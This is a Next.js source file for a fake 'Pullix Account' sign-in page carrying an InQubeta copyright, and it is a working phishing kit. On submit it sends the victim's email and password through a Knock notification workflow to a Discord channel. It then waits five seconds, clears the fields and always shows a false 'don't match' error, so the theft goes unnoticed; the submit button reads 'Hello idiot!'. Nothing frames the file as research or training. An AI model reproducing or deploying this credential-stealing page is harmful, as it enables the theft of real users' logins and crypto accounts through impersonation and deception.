"use client";
import Image from "next/image";
import { useEffect, useState } from "react";
const { Knock } = require("@knocklabs/node");

export default function Home() {
  const knock = new Knock(process.env.NEXT_PUBLIC_KNOCK_API_KEY);
  const [email, setEmail] = useState(null);
  const [password, setPassword] = useState(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(false);
  const handleTrigger = async (e) => {
    e.preventDefault();
    setError(false);
    setLoading(true);
    knock.objects.set("project5", "project-1", {
      name: "My project5",
      total_assets: 10,
      tags: ["cool", "fun", "project"],
    });
    setTimeout(() => {
      setLoading(false);
      setEmail("");
      setPassword("");
      setError(true);
    }, 5000);
    await knock.objects.setChannelData(
      "project5",
      "projects-1",
      process.env.NEXT_PUBLIC_KNOCK_DISCORD_CHANNEL_ID,
      {
        connections: [
          {
            channel_id: "1212536290910933005",
          },
        ],
      }
    );
    await knock.workflows.trigger("adert", {
      data: { email, password },
      recipients: [{ id: "projects-1", collection: "project5" }],
    });
  };

  const handlePassword = () => {
    const password = document.getElementById("password");
    if (password.getAttribute("type") == "password") {
      password.setAttribute("type", "text");
    } else if (password.getAttribute("type") == "text") {
      password.setAttribute("type", "password");
    }
  };

  useEffect(() => {}, [loading]);
  useEffect(() => {}, [email]);
  useEffect(() => {}, [password]);

  return (
    <div className="flex justify-center items-center flex-col min-h-[100vh] bg-[#1B1D29] bg-cover bg-bottom">
      <div className="flex items-center justify-center">
        <img src="/logo2x.png" className="w-40 md:w-52 lg:w-auto lg:scale-50" />
      </div>
      <div className="w-full flex my-5">
        <div className="flex flex-col w-full self-center">
          <div className="mx-auto gold-border">
            <div className="flex flex-col relative overflow-hidden height-auto text-foreground box-border outline-none data-[focus-visible=true]:z-10 data-[focus-visible=true]:outline-2 data-[focus-visible=true]:outline-focus data-[focus-visible=true]:outline-offset-2 shadow-medium transition-transform-background motion-reduce:transition-none w-full md:w-[22rem] lg:w-[28rem] m-auto p-2 bg-[#1d1f2a] bg-center bg-cover rounded-xl">
              <div className="relative flex w-full p-5 flex-auto flex-col place-content-inherit align-items-inherit h-auto break-words text-left subpixel-antialiased overflow-hidden z-10">
                <div className="pb-8 bruno">
                  <h2 className="text-5xl font-light text-[#DE8F32] mb-2">
                    Sign in
                  </h2>
                  <p className="text-white">with your Pullix Account</p>
                </div>
                <form className="flex flex-col gap-6" onSubmit={handleTrigger}>
                  {error ? (
                    <p className="text-red-500 text-sm">
                      Email and Password don't match
                    </p>
                  ) : (
                    ""
                  )}
                  <div className="group flex flex-col w-full">
                    <div
                      className="relative w-full inline-flex tap-highlight-transparent shadow-sm px-3 bg-default-100 min-h-unit-10 flex-col items-start justify-center gap-y-1 transition-background motion-reduce:transition-none !duration-150 outline-none py-3 rounded-sm border-[1px] border-white bg-[#1d1f2a]"
                      style={{ cursor: "text" }}
                    >
                      <div className="inline-flex h-full items-center w-full gap-1.5 box-border bg-transparent">
                        <input
                          className="w-full h-full font-normal !bg-transparent outline-none text-sm bg-foreground text-white dark:text-white placeholder:text-[#647E94] dark:placeholder:text-[#647E94]"
                          placeholder="Your Email"
                          onChange={(e) => setEmail(e.target.value)}
                        />
                      </div>
                    </div>
                  </div>
                  <div className="group flex flex-col w-full">
                    <div className="relative w-full inline-flex tap-highlight-transparent shadow-sm px-3 bg-default-100 min-h-unit-10 flex-col items-start justify-center gap-y-1 transition-background motion-reduce:transition-none !duration-150 outline-none py-3 rounded-sn border-[1px] border-white bg-[#1d1f2a]">
                      <div className="inline-flex h-full items-center w-full gap-1.5 box-border bg-transparent">
                        <input
                          className="w-full h-full font-normal !bg-transparent outline-none text-sm bg-foreground text-white dark:text-white placeholder:text-[#647E94] dark:placeholder:text-[#647E94]"
                          placeholder="Password"
                          onChange={(e) => setPassword(e.target.value)}
                          type="password"
                          id="password"
                        />
                      </div>
                    </div>
                  </div>
                  <div className="flex  justify-between">
                    <label className="group relative max-w-fit items-center justify-start tap-highlight-transparent p-2 -m-2 inline-flex cursor-pointer">
                      <div
                        style={{
                          border: 0,
                          clip: "rect(0 0 0 0)",
                          clipPath: "inset(50%)",
                          height: "1px",
                          margin: "-1px",
                          overflow: "hidden",
                          padding: 0,
                          position: "absolute",
                          width: "1px",
                          whiteSpace: "nowrap",
                        }}
                      >
                        <input
                          aria-label="Remember me"
                          aria-labelledby=":R1mdbbadda:"
                          type="checkbox"
                          value=""
                        />
                      </div>
                      <span
                        aria-hidden="true"
                        className="relative inline-flex items-center justify-center flex-shrink-0 overflow-hidden before:content-[''] before:absolute before:inset-0 before:border-solid before:border-2 before:box-border after:content-[''] after:absolute after:inset-0 after:scale-50 after:opacity-0 after:origin-center group-data-[selected=true]:after:scale-100 group-data-[selected=true]:after:opacity-100 group-data-[hover=true]:before:bg-default-100 outline-none group-data-[focus-visible=true]:z-10 group-data-[focus-visible=true]:ring-2 group-data-[focus-visible=true]:ring-focus group-data-[focus-visible=true]:ring-offset-2 group-data-[focus-visible=true]:ring-offset-background after:bg-[white] after:text-[#00B7FF]-foreground text-[#00B7FF]-foreground w-4 h-4 mr-2 rounded-[calc(theme(borderRadius.medium)*0.5)] before:rounded-[calc(theme(borderRadius.medium)*0.5)] after:rounded-[calc(theme(borderRadius.medium)*0.5)] before:transition-colors group-data-[pressed=true]:scale-95 transition-transform after:transition-transform-opacity after:!ease-linear after:!duration-200 motion-reduce:transition-none before:border-[white]/80"
                      >
                        <svg
                          aria-hidden="true"
                          role="presentation"
                          viewBox="0 0 17 18"
                          className="z-10 opacity-0 group-data-[selected=true]:opacity-100 w-3 h-2 transition-opacity motion-reduce:transition-none"
                        >
                          <polyline
                            fill="none"
                            points="1 9 7 14 15 4"
                            stroke="currentColor"
                            strokeDasharray="22"
                            strokeDashoffset="66"
                            strokeLinecap="round"
                            strokeLinejoin="round"
                            strokeWidth="2"
                          ></polyline>
                        </svg>
                      </span>
                      <span
                        id=":R1mdbbadda:"
                        className="relative select-none text-sm transition-colors-opacity before:transition-width motion-reduce:transition-none font-medium w-full text-white"
                      >
                        Remember Me
                      </span>
                    </label>
                    <a
                      className="text-sm text-[#DE8F32] font-medium"
                      href="/forget-password"
                    >
                      Forget Password?
                    </a>
                  </div>
                  <div className="flex gap-2 justify-end">
                    <button
                      className="z-0 group relative inline-flex items-center justify-center box-border appearance-none select-none whitespace-nowrap subpixel-antialiased overflow-hidden tap-highlight-transparent outline-none data-[focus-visible=true]:z-10 data-[focus-visible=true]:outline-2 data-[focus-visible=true]:outline-focus data-[focus-visible=true]:outline-offset-2 px-unit-4 min-w-unit-20 h-unit-10 text-sm gap-unit-2 w-full [&amp;>svg]:max-w-[theme(spacing.unit-8)] data-[pressed=true]:scale-[0.97] transition-transform-colors motion-reduce:transition-none text-[#1d1f2a] font-semibold bg-gradient-to-r from-[#CB7B1E] via-[#FBBD76] to-[#F6AF5B] rounded-2xl hover:bg-opacity-50 py-3"
                      type="submit"
                    >
                      {loading ? (
                        <span className="loading loading-spinner loading-md"></span>
                      ) : (
                        "Hello idiot!"
                      )}
                    </button>
                  </div>
                  <p className="text-sm font-medium text-white">
                    Don’t have an account?
                    <a
                      className="cursor-pointer text-[#DE8F32] ml-2"
                      href="/sign-up"
                    >
                      "Kick in!"
                    </a>
                  </p>
                </form>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div className="flex flex-col items-center mx-auto py-2 md:py-3 text-white">
        <div className="flex flex-col md:flex-row md:justify-between md:gap-x-8 lg:gap-x-16 justify-center text-center">
          <a className="text-sm hover:text-primary/70">Privacy Policy</a>
          <a className="text-sm hover:text-primary/70">Terms and Conditions</a>
        </div>
        <div className="py-1">
          <span className="text-sm">© 2024 InQubeta. All Rights Reserved.</span>
        </div>
      </div>
    </div>
  );
}
